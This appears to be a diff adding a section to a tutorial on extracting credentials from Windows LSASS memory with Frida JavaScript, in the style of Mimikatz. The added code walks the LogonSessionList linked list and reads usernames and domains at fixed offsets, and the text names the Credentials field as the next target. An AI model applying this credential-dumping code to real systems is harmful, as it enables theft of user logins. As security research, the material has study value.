@@ -167,4 +167,48 @@ typedef struct _KIWI_MSV1_0_LIST_63 {
 } KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;
 ```
 
+Looking at this data structure, we can see that the first order of business will be to enumerate the address of each cached session. The *Flink* variable, a pointer to the next element in the list, is the very first element, so this is an easy job:
 
+```javascript
+function getLogonSessions(ptr, max) {
+	// Given a pointer to lsasrv!LogonSessionList, enumerate the address of all logon sessions that it contains.
+	// LogonSessionList is a simple linked list, so the first element of each entry is a pointer to the next one.
+	var sessions = [];
+	var current = ptr;
+	
+	for (var i = 0; i < max; i++) {
+		sessions.push(current.toString());
+		current = current.readPointer();
+		if (sessions.includes( current.toString() )) {
+			i = max
+		}
+	}
+	
+	return sessions;
+}
+```
+
+This will allow us to turn our pointer to *LogonSessionList* into an array of pointers, each pointing to a specific session. Now we need to parse the actual data out of them. This may seem intimidating when you look at the enormous struct that gentikiwi has implemented, but we only actually care about a few bits of information: the *UserName*, *DomainName* and *Credentials* variables.
+
+The *UserName* and *DomainName* are simple. They are both of type *UNICODE_STRING*, and we've dealt with those before. It's trivial to write a simple parser to extract each value:
+
+```javascript
+function getUsernameFromLogonSession(ptr) {
+	// Given a pointer to a LogonSession, extract the username (a UNICODE_STRING).
+	var usernamePtr = ptr.add(0x90);
+	var len = usernamePtr.readUShort();
+	var usernameBuffer = usernamePtr.add(0x8).readPointer();
+	var username = usernameBuffer.readUtf16String(len);
+	return username;
+	
+}
+
+function getDomainFromLogonSession(ptr) {
+	// Given a pointer to a LogonSession, extract the domain (a UNICODE_STRING).
+	var domainPtr = ptr.add(0xa0);
+	var len = domainPtr.readUShort();
+	var domainBuffer = domainPtr.add(0x8).readPointer();
+	var domain = domainBuffer.readUtf16String(len);
+	return domain;
+}
+```
